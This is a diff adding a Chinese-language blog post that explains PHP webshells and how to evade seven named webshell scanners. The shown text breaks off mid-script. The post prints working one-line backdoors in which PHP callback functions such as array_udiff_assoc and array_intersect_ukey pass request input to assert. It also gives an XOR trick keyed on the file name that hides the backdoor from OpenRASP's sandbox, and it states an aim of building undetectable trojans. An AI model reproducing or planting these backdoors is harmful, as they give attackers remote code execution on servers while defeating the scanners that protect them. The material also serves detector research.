@@ -1,0 +1,1323 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00: 前言   一般的，利用能够执行系统命令、加载代码的函数，或者组合一些普通函数，完成一些高级间谍功能的网站后门的脚本，叫做Webshell。   本篇文章主要探讨关于PHP语言的Webshell检测工具和平台的绕过方法，实现能够绕过以下表格中7个主流(基本代表安全行业内PHP Webshell检测的一流水平)专业工具和平台检测的PHP Webshell，构造出零提示、无警告、无法被检测到">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php马-bypass">
+<meta property="og:url" content="http://alin.run/2020/08/04/php-webshell-bypass/index.html">
+<meta property="og:site_name" content="alin&#39;Blog">
+<meta property="og:description" content="0x00: 前言   一般的，利用能够执行系统命令、加载代码的函数，或者组合一些普通函数，完成一些高级间谍功能的网站后门的脚本，叫做Webshell。   本篇文章主要探讨关于PHP语言的Webshell检测工具和平台的绕过方法，实现能够绕过以下表格中7个主流(基本代表安全行业内PHP Webshell检测的一流水平)专业工具和平台检测的PHP Webshell，构造出零提示、无警告、无法被检测到">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetff08pyj30bh0650so.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetflwn82j30l80au76c.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfq5utwj30lg060weo.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfsg9sgj30lf058mxh.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfuwbvej30mf0de400.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfxjytej30nk08rgma.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg01tikj30n708pt9c.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg2q9qkj30jh08waag.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg635xjj30ng0c8acz.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg9dxvbj30gw067aag.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgd2xa2j30kf0ekwhu.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetggdmjxj30mi06eaae.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgm7eqhj30qy0c8abe.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgp7sy4j30ur07y3yy.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgslq64j306l01ggli.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgvrri0j30qk04tq35.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgzz8o8j30cf06edfs.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gheth2gz8ij30kl04t74f.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gheth58rl6j30m80cswf5.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gheth8vpnhj30rd0fsaaw.jpg">
+<meta property="article:published_time" content="2020-08-04T07:48:44.000Z">
+<meta property="article:modified_time" content="2020-08-04T07:52:34.724Z">
+<meta property="article:author" content="alin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetff08pyj30bh0650so.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://alin.run/2020/08/04/php-webshell-bypass/"/>
+
+
+
+
+
+  <title>php马-bypass | alin'Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?5e6a61cde714ee04a36217a052cbca33";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">alin'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://alin.run/2020/08/04/php-webshell-bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="alin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/mao.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="alin'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php马-bypass</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-04T15:48:44+08:00">
+                2020-08-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00: 前言"></a>0x00: 前言</h2><p>   一般的，利用能够执行系统命令、加载代码的函数，或者组合一些普通函数，完成一些高级间谍功能的网站后门的脚本，叫做Webshell。</p>
+<p>  本篇文章主要探讨关于PHP语言的Webshell检测工具和平台的绕过方法，实现能够绕过以下表格中7个主流(基本代表安全行业内PHP Webshell检测的一流水平)专业工具和平台检测的PHP Webshell，构造出零提示、无警告、无法被检测到的一句话木马后门。</p>
+<table>
+<thead>
+<tr>
+<th>编号</th>
+<th>名称</th>
+<th>参考链接</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>网站<strong>安全狗</strong>网马查杀</td>
+<td><a href="http://download.safedog.cn/download/software/safedogwzApache.exe" target="_blank" rel="noopener">http://download.safedog.cn/download/software/safedogwzApache.exe</a></td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>D盾</strong> Web查杀</td>
+<td><a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip" target="_blank" rel="noopener">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>深信服</strong>WebShellKillerTool</td>
+<td><a href="http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip" target="_blank" rel="noopener">http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip</a></td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>BugScaner</strong> killwebshell</td>
+<td><a href="http://tools.bugscaner.com/killwebshell/" target="_blank" rel="noopener">http://tools.bugscaner.com/killwebshell/</a></td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>河马专业版</strong>查杀Webshell</td>
+<td><a href="http://n.shellpub.com/" target="_blank" rel="noopener">http://n.shellpub.com/</a></td>
+</tr>
+<tr>
+<td>6</td>
+<td><strong>OpenRASP</strong> WEBDIR+检测引擎</td>
+<td><a href="https://scanner.baidu.com" target="_blank" rel="noopener">https://scanner.baidu.com</a></td>
+</tr>
+<tr>
+<td>7</td>
+<td><strong>深度学习模型</strong>检测PHP Webshell</td>
+<td><a href="http://webshell.cdxy.me/" target="_blank" rel="noopener">http://webshell.cdxy.me/</a></td>
+</tr>
+</tbody></table>
+<p>研究期间做了大量的测试，限于篇幅和文章效果，在不影响阅读体验的情况下，部分测试过程和结果略去了。</p>
+<h2 id="0x01：Webshell后门"><a href="#0x01：Webshell后门" class="headerlink" title="0x01：Webshell后门"></a>0x01：Webshell后门</h2><p>目前来讲，我把用纯php代码实现的Webshell后门(以下统称为”木马”)，主要分为以下几类：</p>
+<ul>
+<li><p><strong>单/少功能木马</strong></p>
+<p>能完成写入文件、列目录、查看文件、执行一些系统命令等少量功能的Webshell。</p>
+</li>
+<li><p><strong>逻辑木马</strong></p>
+<p>利用系统逻辑漏洞或构造特殊触发条件，绕过访问控制或执行特殊功能的Webshell。</p>
+</li>
+<li><p><strong>一句话木马</strong></p>
+<p>可以在目标服务器上执行php代码，并和一些客户端(如菜刀、Cknife)进行交互的Webshell。</p>
+</li>
+<li><p><strong>多功能木马</strong></p>
+<p>根据PHP语法，编写较多代码，并在服务器上执行，完成大量间谍功能的Webshell(大马)。</p>
+</li>
+</ul>
+<p>其中，一句话木马的原理如下图：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetff08pyj30bh0650so.jpg" alt="原理图"></p>
+<blockquote>
+<p>客户端将PHP代码使用特殊参数名(密码)，发送给放置在服务端上的一句话木马文件；</p>
+<p>一句话木马脚本则在服务器上执行发来的PHP代码，然后将执行结果回传给客户端，客户端将结果解析并展示给操作者。</p>
+</blockquote>
+<h2 id="0x02：查杀现状研究"><a href="#0x02：查杀现状研究" class="headerlink" title="0x02：查杀现状研究"></a>0x02：查杀现状研究</h2><p>根据0x01的一句话木马原理，我们知道必须要在服务器上执行客户端发来的字符串形式的PHP代码。</p>
+<p>脚本要将字符串(或文件流)当作PHP代码执行，目前主要会使用以下函数：</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">eval</td>
+<td>PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为PHP代码执行</td>
+</tr>
+<tr>
+<td align="center">assert</td>
+<td>PHP 4, PHP 5, PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8版本后可以接受两个参数</td>
+</tr>
+<tr>
+<td align="center">正则匹配类</td>
+<td>preg_replace/ mb_ereg_replace/preg_filter等</td>
+</tr>
+<tr>
+<td align="center">文件包含类</td>
+<td>include/include_once/require/require_once/file_get_contents等</td>
+</tr>
+</tbody></table>
+<p>本文为了好说明问题，统一将上面表中可以将字符串当作代码执行的函数临时起个名字，叫”<strong>函数机</strong>“。</p>
+<p>不幸的是，但凡直接出现函数机，即便不是进行恶意操作，部分查杀软件也会产生警告，达不到我们的要求。</p>
+<p>比如用D盾检测如下脚本：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetflwn82j30l80au76c.jpg" alt="检测到可疑"></p>
+<p>  然后，就需要方法来隐藏上面的函数机。但是随着攻防对抗的升级，较传统的字符串拆分、变形、进制转换、运算变换等躲避Webshell查杀的效果已经大大降低。</p>
+<p>  所以，经过调研和比较，本文选择了通过可以携带参数的PHP回调函数来创造后门的技术，来实现绕过检测软件的一句话木马后门。</p>
+<p>  拿出来曾经披露过的一个回调函数后门函数”register_shutdown_function”做测试，发现虽然D盾、深信服的工具没有发觉到”register_shutdown_function”加 “assert”的变形，但是安全狗还是察觉到了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$ch = explode(<span class="string">"."</span>,<span class="string">"hello.ass.world.er.t"</span>);</span><br><span class="line">register_shutdown_function($ch[<span class="number">1</span>].$ch[<span class="number">3</span>].$ch[<span class="number">4</span>], $_REQUEST[$password]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfq5utwj30lg060weo.jpg" alt="初步绕过被发现"></p>
+<p>所以，有理由推测，有一个恶意函数库，凡是网络上披露过的可用作后门的回调函数，都可能在其中，而且很大概率上会被检测出来。</p>
+<p>经过收集，发现网络上50多个<strong>已披露出来的</strong>可用作后门的回调函数和类中，有部分函数仍然可以用来绕过Webshell查杀软件。</p>
+<h2 id="0x03：查找可做后门的回调函数"><a href="#0x03：查找可做后门的回调函数" class="headerlink" title="0x03：查找可做后门的回调函数"></a>0x03：查找可做后门的回调函数</h2><p>去<a href="http://php.net/manual/zh/" target="_blank" rel="noopener">PHP官网</a>查阅函数手册，查找可以用作后门的PHP回调函数，根据实际经验，利用下面五个关键词，能提高查找到拥有后门潜质的PHP回调函数的效率：</p>
+<h5 id="关键词一：callable"><a href="#关键词一：callable" class="headerlink" title="关键词一：callable"></a>关键词一：callable</h5><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfsg9sgj30lf058mxh.jpg" alt="关键词1"></p>
+<h5 id="关键词二：mixed-options"><a href="#关键词二：mixed-options" class="headerlink" title="关键词二：mixed $options"></a>关键词二：mixed $options</h5><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfuwbvej30mf0de400.jpg" alt="关键词2"></p>
+<h5 id="关键词三：handler"><a href="#关键词三：handler" class="headerlink" title="关键词三：handler"></a>关键词三：handler</h5><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfxjytej30nk08rgma.jpg" alt="关键词3"></p>
+<h5 id="关键词四：callback"><a href="#关键词四：callback" class="headerlink" title="关键词四：callback"></a>关键词四：callback</h5><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg01tikj30n708pt9c.jpg" alt="关键词4"></p>
+<h5 id="关键词五：invoke"><a href="#关键词五：invoke" class="headerlink" title="关键词五：invoke"></a>关键词五：invoke</h5><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg2q9qkj30jh08waag.jpg" alt="关键词5"></p>
+<p>除此之外，<strong>PHP扩展</strong>中也有些合适的回调函数，不过可能通用性不强，本文不做讨论。</p>
+<h2 id="0x04：绕过传统检测"><a href="#0x04：绕过传统检测" class="headerlink" title="0x04：绕过传统检测"></a>0x04：绕过传统检测</h2><p>先拿披露过的array_udiff_assoc()函数构造一个免杀一句话。</p>
+<p>函数定义：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> array_udiff_assoc ( <span class="keyword">array</span> $array1 , <span class="keyword">array</span> $array2 [, <span class="keyword">array</span> $... ], callable $value_compare_func )</span><br></pre></td></tr></table></figure>
+
+<p>根据定义，可以构造代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_udiff_assoc(<span class="keyword">array</span>(<span class="string">"phpinfo();"</span>), <span class="keyword">array</span>(<span class="number">1</span>), <span class="string">"assert"</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg635xjj30ng0c8acz.jpg" alt="执行成功">)继续构造适合客户端连接的一句话木马脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/array_udiff_assoc.php" target="_blank" rel="noopener">array_udiff_assoc.php</a>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Noticed: (PHP 5 &gt;= 5.4.0, PHP 7)</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">array_udiff_assoc(<span class="keyword">array</span>($_REQUEST[$password]), <span class="keyword">array</span>(<span class="number">1</span>), <span class="string">"assert"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>浏览器访问</p>
+<p><code>http://127.0.0.1/shell/test/test.php?LandGrey=phpinfo();</code></p>
+<p>Cknife添加目标<code>http://127.0.0.1/shell/test/test.php</code>  密码: LandGrey，可成功连接。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg9dxvbj30gw067aag.jpg" alt="Cknife连接"></p>
+<p>用查杀工具检测：只有故意放置的一个eval一句话被查出来。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgd2xa2j30kf0ekwhu.jpg" alt="查杀工具测试"></p>
+<p>bugscaner 在线查杀，通过</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetggdmjxj30mi06eaae.jpg" alt="bugscanner在线查杀"></p>
+<p>使用河马正式版在线查杀，通过</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgm7eqhj30qy0c8abe.jpg" alt="河马正式版在线查杀"></p>
+<p>至此，我们<strong>已经绕过安全狗、D盾和深信服的客户端Webshell查杀和bugscaner、河马正式版的在线查杀</strong>。</p>
+<p>可以发现，只需找一个网络上没有”<strong>频繁出现</strong>“或”<strong>没有出现过</strong>“回调函数，<strong>稍加变形</strong>，即可绕过传统技术的检测。</p>
+<p>再给一个”array_intersect_ukey”反调函数的免杀示例<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/array_intersect_ukey.php" target="_blank" rel="noopener">array_intersect_ukey.php</a>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Noticed: (PHP 5 &gt;= 5.4.0, PHP 7)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$ch = explode(<span class="string">"."</span>,<span class="string">"hello.ass.world.er.t"</span>);</span><br><span class="line">array_intersect_ukey(<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="number">1</span>), <span class="keyword">array</span>(<span class="number">1</span>), $ch[<span class="number">1</span>].$ch[<span class="number">3</span>].$ch[<span class="number">4</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05：突破OpenRASP-WebShell沙盒检测"><a href="#0x05：突破OpenRASP-WebShell沙盒检测" class="headerlink" title="0x05：突破OpenRASP WebShell沙盒检测"></a>0x05：突破<strong>OpenRASP</strong> WebShell沙盒检测</h2><p>接着用OpenRASP团队的WEBDIR+在线查杀平台，被查出来是后门</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgp7sy4j30ur07y3yy.jpg" alt="OpenRASP在线查杀"></p>
+<p>经过反复测试和观察，OpenRASP 团队的Webshell检测使用了动态监测技术，原理上应该是<strong>将脚本放在安全沙盒中执行，分析脚本行为、尝试触发脚本的后门动作等</strong>。不管混淆的脚本多厉害，使用了多巧妙的函数，试执行时基本都会被检测出来。</p>
+<p>刚开始时，发现使用<strong>PHP脚本加密技术</strong>，可以有效绕过OpenRASP团队的WEBDIR+ Webshell检测服务。但加密动作太大，会被D盾或深信服的Webshell查杀软件警告，不仅不能实现零警告和无提示，人眼一看就会发现有问题，所以放弃了加密脚本这条路。</p>
+<p>然后就陷入了一段时间的思索，这里给出一种基于免杀的回调函数，<strong>利用信息不对称</strong>来绕过OpenRASP  WEBDIR+平台检测的技术：</p>
+<ol>
+<li><h4 id="利用重命名前后的脚本名不同"><a href="#利用重命名前后的脚本名不同" class="headerlink" title="利用重命名前后的脚本名不同"></a>利用重命名前后的脚本名不同</h4></li>
+</ol>
+<p>在检测几次后，观察发现WEBDIR+ 把上传文件都按照文件哈希值重名了</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgslq64j306l01ggli.jpg" alt="OpenRASP在线查杀"></p>
+<p>所示，猜测该平台是先将上传脚本重命名，然后再在沙盒中试执行检测Webshell。那么就可以利用一句话脚本文件名在重命名前后的差别，完成绕过。一段核心的绕过检测的木马代码<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/array_intersect_uassoc-file-last-char-must-be-s.php" target="_blank" rel="noopener">array_intersect_uassoc-s.php</a>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; = substr(<span class="keyword">__FILE__</span>,<span class="number">-5</span>,<span class="number">-4</span>) . <span class="string">"class"</span>;</span><br><span class="line">$f = $LandGrey ^ hex2bin(<span class="string">"12101f040107"</span>);</span><br><span class="line">array_intersect_uassoc (<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>脚本名必须是”***s.php”的名字形式，即最后一位字符要为”s”，然后用”sclass” 和 hex2bin(“12101f040107”)的值按位异或，得到”assert”，从而利用回调函数，执行PHP代码。</p>
+<p>上传到WEBDIR+系统后，脚本被重命名，”<strong>试执行时自然无法复现木马行为</strong>“，从而绕过了检测。这种方式有一种明显的要求，就是我们能够准确预知或控制脚本名的最后一位字符。</p>
+<p>如果写成通用型脚本，根据文件名的最后一位字符，自动选择做异或的字符串，得到”assert”，代码示例如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$key = substr(<span class="keyword">__FILE__</span>,<span class="number">-5</span>,<span class="number">-4</span>);</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; =  $key.<span class="string">"Land!"</span>;</span><br><span class="line">$trick = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"0"</span> =&gt; <span class="string">"51"</span>, <span class="string">"1"</span> =&gt; <span class="string">"50"</span>, <span class="string">"2"</span> =&gt; <span class="string">"53"</span>, <span class="string">"3"</span> =&gt; <span class="string">"52"</span>, <span class="string">"4"</span> =&gt; <span class="string">"55"</span>, <span class="string">"5"</span> =&gt; <span class="string">"54"</span>, <span class="string">"6"</span> =&gt; <span class="string">"57"</span>, <span class="string">"7"</span> =&gt; <span class="string">"56"</span>, <span class="string">"8"</span> =&gt; <span class="string">"59"</span>,</span><br><span class="line">    <span class="string">"9"</span> =&gt; <span class="string">"58"</span>, <span class="string">"a"</span> =&gt; <span class="string">"00"</span>, <span class="string">"b"</span> =&gt; <span class="string">"03"</span>, <span class="string">"c"</span> =&gt; <span class="string">"02"</span>, <span class="string">"d"</span> =&gt; <span class="string">"05"</span>, <span class="string">"e"</span> =&gt; <span class="string">"04"</span>, <span class="string">"f"</span> =&gt; <span class="string">"07"</span>, <span class="string">"g"</span> =&gt; <span class="string">"06"</span>, <span class="string">"h"</span> =&gt; <span class="string">"09"</span>,</span><br><span class="line">    <span class="string">"i"</span> =&gt; <span class="string">"08"</span>, <span class="string">"j"</span> =&gt; <span class="string">"0b"</span>, <span class="string">"k"</span> =&gt; <span class="string">"0a"</span>, <span class="string">"l"</span> =&gt; <span class="string">"0d"</span>, <span class="string">"m"</span> =&gt; <span class="string">"0c"</span>, <span class="string">"n"</span> =&gt; <span class="string">"0f"</span>, <span class="string">"o"</span> =&gt; <span class="string">"0e"</span>, <span class="string">"p"</span> =&gt; <span class="string">"11"</span>, <span class="string">"q"</span> =&gt; <span class="string">"10"</span>,</span><br><span class="line">    <span class="string">"r"</span> =&gt; <span class="string">"13"</span>, <span class="string">"s"</span> =&gt; <span class="string">"12"</span>, <span class="string">"t"</span> =&gt; <span class="string">"15"</span>, <span class="string">"u"</span> =&gt; <span class="string">"14"</span>, <span class="string">"v"</span> =&gt; <span class="string">"17"</span>, <span class="string">"w"</span> =&gt; <span class="string">"16"</span>, <span class="string">"x"</span> =&gt; <span class="string">"19"</span>, <span 